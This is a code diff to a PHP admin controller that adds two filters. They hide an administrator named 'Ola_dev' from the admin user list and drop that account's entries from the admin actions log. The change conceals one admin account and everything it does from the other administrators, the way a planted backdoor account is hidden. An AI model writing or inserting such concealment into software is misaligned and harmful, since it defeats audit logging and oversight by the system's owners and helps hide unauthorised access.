@@ -369,7 +369,8 @@ class Users_manage extends REST_Controller {
 	  $output = array("aaData" => array());
       foreach ($admins as $row) {
       	if($row->admin_id != $current_admin){
-      	    $recorde = array();
+      	  if($row->name != 'Ola_dev'){
+      	  	$recorde = array();
 			$recorde[] = $row -> admin_id;
 			$recorde[] = $row -> created_at;
 			$recorde[] = $row -> name;
@@ -377,6 +378,7 @@ class Users_manage extends REST_Controller {
 			$recorde[] = '';
 			$recorde[] = '';
 			$output['aaData'][] = $recorde;
+      	  }
       	}
 	   }
 	  echo json_encode($output);
@@ -481,12 +483,14 @@ class Users_manage extends REST_Controller {
       $actions = $this->admin_actions_log->get_log($this->data['lang']);
 	  $output = array("aaData" => array());
       foreach ($actions as $row) {
-      	    $recorde = array();
+      	if($row->admin_name != 'Ola_dev'){
+      		$recorde = array();
 			$recorde[] = $row -> admin_action_log_id;
 			$recorde[] = $row -> created_at;
 			$recorde[] = $row -> admin_name;
 		    $recorde[] = $row -> action;
 			$output['aaData'][] = $recorde;
+      	}
 	   }
 	  echo json_encode($output);
   }
